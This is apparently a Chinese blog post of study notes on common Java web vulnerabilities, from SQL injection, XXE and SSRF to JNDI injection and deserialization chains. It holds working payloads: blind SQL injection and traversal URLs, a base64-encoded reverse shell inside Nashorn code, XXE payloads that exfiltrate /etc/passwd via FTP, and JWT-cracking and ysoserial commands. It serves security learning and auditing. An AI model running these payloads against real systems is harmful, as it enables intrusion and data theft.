---
title: "Java Web 常见漏洞"
permalink: java-web-vulnerabilities/
date: 2025-12-29 05:32:51
categories:
  - 网络安全
  - Web 安全
tags:
  - Java
  - Fastjson
  - 反序列化
img: /medias/featureimages/19.jpg
summary: "Fastjson、Log4j2、Shiro、Spring 等典型 Java 组件漏洞的原理、探测与利用要点。"
---

<!-- more -->

## Java  动态调试
## java 简介
编译型语言和解释型语言的区别？

### 编译型语言：
不能直接运行，需要预先编译成可执行程序 （PE、ELF）

**可执行程序（PE / ELF）** 是操作系统加载并运行的二进制文件格式 ( 可执行程序是**操作系统能够直接加载到内存并执行的文件**)

+ C -> 编译-> PE/ELF -> 运行
+ Go
+ Rust

### 解释型语言
由解释器或运行时直接运行

+ Python -> python 解释器 直接运行
+ PHP
+ JavaScript

Java：既不是编译型语言，也不是解释型语言

Java -> javac编译-> class 文件 -> jvm 解释运行

**JDK（Java Development Kit）** 是 **Java 开发工具包**，是用于开发和运行 Java 应用程序的**完整软件开发环境**

Java、 Kotlin 、Groovy 都是java，Java就是Java，Kotlin 是开发安卓的Java、Groovy是java脚本用来构建Gradle

“**空安全**”（Null Safety）是现代编程语言中用于**防止空指针异常**的一种语言级机制。它通过**在编译期强制检查变量是否可能为 null**，从而避免程序在运行时因访问 null 值而崩溃。

## Java 项目的构建

## IDEA
[https://www.jetbrains.com/idea/](https://www.jetbrains.com/idea/)

## maven
Maven 是项目管理和构建自动化工具

Maven 和 Gradle 是真正的构建系统（Build System），而 IntelliJ 是一个 集成开发环境（IDE），不是构建工具。

## pom.xml
 java依赖库的名字和版本 （代码审计的关键， java 依赖库可能有历史漏洞 [比如 log4j2、shiro、 fastjson，都是依赖库出现的漏洞]

`pom.xml` 是 **Apache Maven** 构建工具的核心配置文件，全称为 **Project Object Model**（项目对象模型）。它是一个 **XML 文件**，用于定义 Java 项目的结构、依赖、插件、构建流程等信息。Maven 通过读取 `pom.xml` 来自动化完成编译、测试、打包、部署等任务。

## 生命周期

package 打包：自动把 java 代码编译为 Class 文件后，再打包成 jar 文件，使用者通过 java -jar 命令就能运行 java 了

## JDWP
JDWP：Java远程调试协议 ，是Java 虚拟机（JVM）与调试器（如 IntelliJ IDEA、Eclipse 或 GDB）之间进行通信的“语言 ，默认的监听端口是 5005

## IDEA 和 JDWP 联用

## 怎么找到对应代码 （接口查找）
以 JDBC sql注入举例

## Java Web常见漏洞
## 1 SQL注入
###  JDBC 注入
JDBC（Java Database Connectivity）是 Java 语言中用来规范客户端程序如何访问数据库的应用程序接口， 比如 java 想要连接mysql、mssql 、Oracle 就可以使用jdbc

### 审计规则
1  在入口点下断点

2  步过，看输入的参数是否能够到达SQL语句中，且到达SQL语句时，有没有变化

+  ✅能够到达SQL语句
+  ✅没变化 则说明有SQL注入漏洞

### 拓展：spingboot 概述
#### 接口uri 怎么拼接
```php
@RequestMapping("/vulnapi/sqli/jdbc")
@GetMapping("/vul2")

拼接起来即可 /vulnapi/sqli/jdbc/vul2
```

#### 怎么确定参数的键名
```php
public String vul2(String id)
参数就是id
```

```php
public String safe5(String name)
参数就是name
```

### mybatis 注入
mybatis是一款用于持久层的、轻量级的半自动化**ORM框架**，封装了所有jdbc操作以及设置查询 参数和获取结果集的操作

### 注解类型注入
mybatis 支持注解类型的SQL 语句

#### 判断依据：
#### 找到注解中的 SQL 语句
+ 如果SQL语句中的参数使用 ${} 包裹，则基本有SQL注入漏洞
+ 如果SQL语句中的参数使用 #{} 包裹，则mybatis自动进行SQL语句预处理，没有SQL注入

```xml
@Select("select * from users where id = ${id}")
List<User> queryByIdAsInterger(@Param("id") Integer id);

不存在sql注入漏洞，原因是使用了 ${}，但限制了id必须是 Integer 整数
```

```xml
@Select("select * from users where user = #{user}")
List<UserIDOR> queryByUser2(@Param("user") String user);

不存在sql注入漏洞，原因是使用了 #{}
```

```xml
@Select("select * from users where id = ${id}")
List<User> queryByIdAsString(@Param("id") String id);

存在sql注入漏洞，原因是使用了 ${}
```

```xml
@Select("select * from users order by ${field} ${sort}")
List<User> orderBy2(@Param("field") String field,
@Param("sort") String sort);

存在sql注入漏洞，原因是使用了 ${}
```

### 怎么利用 PathVariables 参数SQL注入
#### 直接通过 uri 传参的方式

#### sqlmap

### 怎么利用 order by 注入
order by 排序注入，一般会让用户输入两个参数，一个参数是列名或列序号，一个参数是升序(ASC)或 降序(desc)

field 和 sort 是用户从前端传入的参数

如果用户传入 field=2&sort=desc 则 SQL语句会变为

`select * from users order by 2 desc  `

#### 利用1：遍历参数测出列数
正常显示  `http://192.168.79.120:8888/vulnapi/sqli/mybatis/vul/order2?field=4&sort=desc`

`http://192.168.79.120:8888/vulnapi/sqli/mybatis/vul/order2?field=5&sort=desc` 报错

 说明结果有 4列

#### 利用2： 时间盲注
`http://192.168.79.120:8888/vulnapi/sqli/mybatis/vul/order2?field=if(left(user(),4) = 'root',sleep(3),0)&sort=desc`

### XML类型注入
mybatis 的SQL语句支持 注解编辑 或 放到 XML 文件中

找到保存SQL语句的 XML 文件进行审计，审计的方式与注解类型的mybatis 相同

## 2  任意文件上传
一般情况下，java web的文件上传api 一定有 upload 字符

+ 目标是否支持 jsp ，如果支持 jsp ，可以上传 jsp webshell （springboot 框架写的网站默认不 支持 jsp）
+ 如果不支持，只能上传一些脏文件 （非常大的文件、 特殊的PDF造成xss [任何src/企业都不 收]）

## 3  任意文件读取、任意文件下载、目录遍历
java web 中非常常见

`http://192.168.79.120:8888/vulnapi/Traversal/download?filename=../../../../../../../etc/passwd`

怎么判断是文件下载

在http中如果想使用浏览器下载文件，都有有固定的响应头 Content-Disposition: attachment;filename=下载的文件名

## 4  jwt json web token 安全隐患
###  jwt 简介
json web token，用于身份验证，jwt可能在cookie里，也可能在其他的请求头中，也可能在请求体中

### jwt 的特征和构造
**两点分隔三部分**，每部分都是base64编码字符串

JWT_TOKEN=`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjcwODczOTAsImV4cCI6MTc2NzE3Mzc5MCwidXNlcm5hbWUiOiJhZG1pbiJ9.6V5f1olE_VrCNTftM0IWy7O1ks5yjJuM4VLtGZUrg2w`

三部分，分别是：

+ 头 （签名算法）
+ payload 载荷 （用户信息、 生成时间、过期时间）
+ 签名 （密钥）

[https://www.jwt.io/](https://www.jwt.io/)

### jwt 有哪些隐患
+ alg 是 none， 没有加密，不需要密码，攻击者可以随意伪造 jwt
+ alg 不是 none，有加密，但是黑客如果知道密码，攻击者可以伪造 jwt （黑客如何获取 jwt的 密码呢？ 暴力破解 、 代码中泄露、 springboot actuator泄露 ）

代码中泄露：自己找

暴力破解：https://github.com/Ch1ngg/JWTPyCrack

`python jwtcrack.py -m blasting -s "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjcwODczOTAsImV4cCI6MTc2NzE3Mzc5MCwidXNlcm5hbWUiOiJhZG1pbiJ9.6V5f1olE_VrCNTftM0IWy7O1ks5yjJuM4VLtGZUrg2w" --kf /home/yu/fuzzDicts/passwordDict/top1000.txt`

`python jwtcrack.py -m blasting -s "抓包看到JWT字符串" --kf 密码字典的路径  `

#### springboot actuator 泄露

###  jwt 伪造
jwt 伪造可以实现任意用户登录

[https://www.bejson.com/jwt/](https://www.bejson.com/jwt/)

## 5 SSRF
URL 类的 openConnection 方法可以对 URL 发起连接

### 利用 - file://
+ 列目录

 `file:///  `

 `file:/// var `

+ 读文件

 `file:///etc/passwd  `

` file:///etc/hosts  `

### 利用 - http://
攻击内网，探测内网，读取云服务器的元数据  [https://forum.butian.net/share/2412](https://forum.butian.net/share/2412)

### 利用 - netdoc://
+ 读文件

 `netdoc:///etc/passwd`

## 6 RCE
### Runtime.getRuntime().exec()
### java 哪些类和方法能实现执行命令
+ **Runtime.getRuntime().exec()** [反弹shell必须要预先base64编码]

+ **ProcessBuilder**类start方法 [反弹shell不需要base64编码]
+ ProcessImpl反射加载执行命令 [这是 final 类，一般不会使用该方法，但 ProcessImpl 是 java 所有命令执行的根源]
+ GroovyShell类evaluate方法 [反弹shell必须要预先base64编码]
+ java javascript引擎Nashorn的eval方法执行命令 [反弹shell必须要预先base64编码]

 java 的 js 引擎可以在 java 代码中嵌入 js 代码，让java具有动态语言的特性

### nashorn 利用举例

#### 1  编写恶意的js 代码 1.js

`var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMjAuMTAxLzc1ODYgMD4mMQ==}|{base64,-d}|{bash,-i}");}`

#### 2  开启 http 监听 （用于下载js文件）和 nc tcp 监听（用于反弹shell）

#### 3  攻击目标网站

## 7 XXE
### 解析xml的类
有哪些类的方法可以解析 xml ？java 有大量第三方依赖可以解析 xml，触发xxe漏洞

XMLReader parse ✨

SAXParser parse

SAXReader read

SAXBuilder build

DocumentBuilder parse

Unmarshaller unmarshal

### java xxe 利用
#### 有回显
直接读取文件

+ file:// 协议
+ netdoc:// 协议

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<person><name>&xxe;</name></person>
```

#### 无回显（盲打xxe）
java 无回显盲打xxe方法：

+ file:// 协议 ，缺点：读取的文件里不能有特殊字符，且只能读取一行
+ netdoc:// 协议，和 file:// 一样
+ ftp:// 协议，可以读多行文件，缺点：jdk 8u162修复了 ftp:// 协议
+ 报错xxe，缺点：必须要有对应的依赖库

`https://github.com/bfengj/CTF/blob/main/Web/java/XXE/Java%E4%B8%AD%E7%9A%84XXE. md  `

#####  ftp外带数据
###### 1  服务器上安装ruby，写个ftp.rb

```xml
require 'socket'
server = TCPServer.new 39802
loop do
  Thread.start(server.accept) do |client|
    puts "New client connected"
    data = ""
    client.puts("220 xxe-ftp-server")
    loop {
        req = client.gets()
        puts "< "+req
        if req.include? "USER"
            client.puts("331 password please - version check")
        else
           #puts "> 230 more data please!"
            client.puts("230 more data please!")
        end
    }
  end
end
```

###### 2  写个po.dtt

```xml
<!ENTITY % file SYSTEM 'file:///etc/passwd'>
<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'ftp://192.168.79.129:39802/%file;'>">
%payload;
%send;
```

###### 3 开启8000 监听，与 启动`ruby ftp.rb`，然后ftp打

###### 4 访问网站
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
<!ENTITY % x SYSTEM "http://192.168.79.129:8000/po.dtt">
%x;
]>
<xml>
<xxe>855</xxe>
</xml>
```

###### 5 收到信息

##### 报错xxe  (openjdk docker fontconfig-config 依赖打)
###### payload：
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message>any text</message>
```

##### 外部dtd打报错xxe
###### 1  攻击机编写 dtd 文件
```xml
<!ENTITY % test "example">
<!ELEMENT pattern (%test;)>
```

###### 2  攻击机开监听

###### 3 用 payload 攻击目标
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "http://192.168.79.120:8000/sd.dtd">

    <!ENTITY % test 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/hosts">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message>any text</message>
```

## 8  JNDI 注入
JNDI（Java Naming and Directory Interface java 命名和目录接口）：java可以通过 jndi 查找资源，访问各种服务

#### JNDI注入漏洞：
InitialContext类lookup方法 参数可控，导致用户可以传入任意的 jndi 字符串，实现恶意类的加载

#### JNDI 漏洞攻击
#####  rmi 协议
######  远程方法调用
### reference远程加载类

### 高版本jdk的jndi注入 - Java反序列化 / BeanFactory
#### rmi 协议本身就是反序列化
前提：需要找到可用java反序列化利用链，才能使用该方法绕过 高版本 jdk 的限制

### 最新版jdk采取的修复与防御措施
新版的jdk虽然没有移除 rmi 的反序列化功能，但是把常见的反序列化利用链都列入了黑名单，如 果找不到新的反序列化利用链，rmi将无法使用

##### ldap 协议
###### 轻型目录访问协议
### reference远程加载类
使用 reference 类直接 加载恶意的远程类到服务器上

### 高版本jdk的jndi注入 - BeanFactory
jdk高版本中，限制了 reference 类直接 加载恶意的远程类到服务器上的操作，高版本jdk 把 trustURLCodebase配置默认改为了 false

**BeanFactory** 用 jndi 加载本地类实现攻击（前提目标服务器要有tomcat依赖） 适用场景：BeanFactory 是 org.apache.naming.factory.BeanFactory ，是tomcat**自带的工厂类**， 大部分 Tomcat 版本均可使用，与jdk版本无关

### 高版本jdk的jndi注入 - Java反序列化
jndi注入使用ldap 时，会自动对 ldap 中 javaSerializedData 字段进行自动反序列化 前提：需要找到可用java反序列化利用链，才能使用该方法绕过 高版本 jdk 的限制

### 最新版jdk采取的修复与防御措施
移除了 javaSerializedData 字段，反序列化无法再使用 ， 高版本jdk的jndi注入 - Java反序列化 方法失效

### 攻击演示-JNDI注入工具
工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

 (只能使用 jdk 8u241 以下版本运行)

#### 1  在攻击机中运行
`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 攻击机的IP地址 -C "反 弹shell命令"  `

 作用：自动打开 ldap （1389）和 rmi （1099）监听

#### 2  在攻击机中运行

#### 3  攻击目标网站

### 攻击演示-Javachains 工具
 官方文档  ：[https://java-chains.vulhub.org/zh/docs/guide](https://java-chains.vulhub.org/zh/docs/guide)

github仓库：  [https://github.com/vulhub/java-chains](https://github.com/vulhub/java-chains)

 java-chains安装

```xml
docker run -d \
  --name java-chains \
  --restart=always \
  -p 8011:8011 \
  -p 58080:58080 \
  -p 50389:50389 \
  -p 50388:50388 \
  -p 3308:3308 \
  -p 13999:13999 \
  -p 50000:50000 \
  -p 11527:11527 \
  -e CHAINS_AUTH=true \
  -e CHAINS_PASS= \
  javachains/javachains:latest

docker logs $(docker ps | grep javachains/javachains | awk '{print $1}') | grep -E 'password'

登录页面：http://your-ip:8011
```

⚠️ ：如果是国内的服务器，默认无法连接到 docker hub 进行 pull 镜像，需要使用云服务商提供 的加速器

 腾讯云  ：[https://cloud.tencent.com/document/product/1207/45596](https://cloud.tencent.com/document/product/1207/45596)

阿里云  ： [https://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images](https://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images)

#### 启动JNDI Control

#### JNDI Basic Payload

#### JNDIResourceRefPayload
对应上文笔记 高版本jdk的jndi注入 - BeanFactory

####  JNDI LDAP Deserialized Payload
对应上文笔记 高版本jdk的jndi注入 - Java反序列化

#### JNDI RMI Deserialized Payload
对应上文 高版本jdk的jndi注入-Java反序列化

## 9  Java反序列化 （readObject）
+  序列化： java 使用 writeObject 方法，把jvm中的对象变为可以传输的字节码
+  反序列化：java 使用 readObject 方法，把字节码转为 jvm中的对象

### 攻击流程 - 反序列化链
## ysoserial
[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)

 `java -jar ysoserial.jar  `

### URLDNS 链
作用：向URL中的域名发起DNS解析，经常用于检测 java 反序列化漏洞是否存在

`java -jar ysoserial.jar URLDNS "http://20251231.dwxu9j.dnslog.cn" | base64 -w 0 `

如果使用windows 运行 ysoserial.jar ，因为windows没有base64命令，可以先导出文件，在使用 编码工具，把文件内容进行编码

 `java -jar ysoserial.jar URLDNS "http://20251231.dwxu9j.dnslog.cn" > 666  `

攻击目标网站，在dnslog 中看到对应的解析结果，则证明目标网站存在反序列化漏洞

###  CB1 链
`java -jar ysoserial.jar CommonsBeanutils1 "反弹shell命令" | base64  - w 0 `

打漏洞

### 攻击流程 - java chains

##  利用链原理 - CC1
+ 起点 (source)：readObject ， 被一些类重写的 readObject
+ 终点 （sink）: Runtime.getRuntime.exec

前提：反序列化中用到的类和对象，都是通过反射加载的 （反射： java运行时动态加载对象， 参考JavaSE）

```xml
AnnotationInvocationHandler.readObject()
Map(Proxy).entrySet()
AnnotationInvocationHandler.invoke()
LazyMap.get()
ChainedTransformer.transform()-ConstantTransformer.transform()-
InvokerTransformer.transform()
```

问1：谁会调用 Runtime.getRuntime.exec('calc') ？

答1：InvokerTransformer 类的 transform 方法 和 ConstantTransformer 类的 transform 方法

问2： 谁会调用 InvokerTransformer 类和ConstantTransformer 类的 transform 方法？

答2： LazyMap 类的 get 方法，调用了 transform 方法 （前提：factory 是 InvokerTransformer 类 和 ConstantTransformer 类 的对象）

问3：谁会调用 LazyMap 类的 get 方法？

答3：AnnotationInvocationHandler 类的 invoke 方法调用了 get 方法 （前提： this.memberValues 是 LazyMap 类的对象）

问4： 谁会调用 AnnotationInvocationHandler 类的 invoke 方法 ？

答4： java动态代理，会自动调用 invoke 方法 ，即 Map(Proxy).entrySet()

问5：谁会调用 Map(Proxy).entrySet() 呢？

答5： AnnotationInvocationHandler 类的 readObject 方法会调用 entrySet （前提： this.memberValues是Map(Proxy) 类的对象 ）

问6：谁会调用 AnnotationInvocationHandler 类的 readObject 方法 ？

答6： 反序列化自动调用

## 利用链原理 - URLDNS
+ HashMap.readObject()
+ HashMap.putVal()
+ HashMap.hash()
+ URL.hashCode()

目标：URLStreamHandler类的 hashCode方法 的 getHostAddress 发起 DNS解析

起点：readObject

问1： 谁会调用 URLStreamHandler类的 hashCode方法？

答1： URL类的 HashCode方法调用了 hashCode方法 （前提： handler 是 URLStreamHandler 类 的对象）

问2：谁会 URL类的 HashCode方法 ？

答2：HashMap 类的 hash 方法会调用 HashCode 方法 （前提： k 是 URL 类的对象）

问3：谁会调用HashMap 类的 hash 方法？

答3：HashMap 的 putVal 方法会调用 hash 方法

问4： 谁会调用 HashMap的 readObject方法

答4： 反序列化自动调用
